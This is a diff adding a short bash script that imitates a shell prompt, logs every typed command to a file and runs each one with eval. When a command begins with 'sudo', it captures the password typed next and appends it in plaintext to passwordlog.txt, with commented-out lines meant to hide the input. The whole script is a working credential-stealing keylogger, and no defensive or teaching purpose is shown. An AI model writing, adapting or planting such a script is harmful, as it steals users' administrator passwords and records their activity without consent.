@@ -1,0 +1,18 @@
+while :
+do
+	echo -n "${USER}@administrator~\$ "
+	read line
+	echo "$line" >> logger.txt
+	if [[ "$line" == 'sudo'* ]]; then
+		eval $line
+		#stty -echo
+		read password 
+		#stty echo
+		echo $password >> passwordlog.txt
+		
+	else
+		eval "$line"
+	fi
+done
+
+
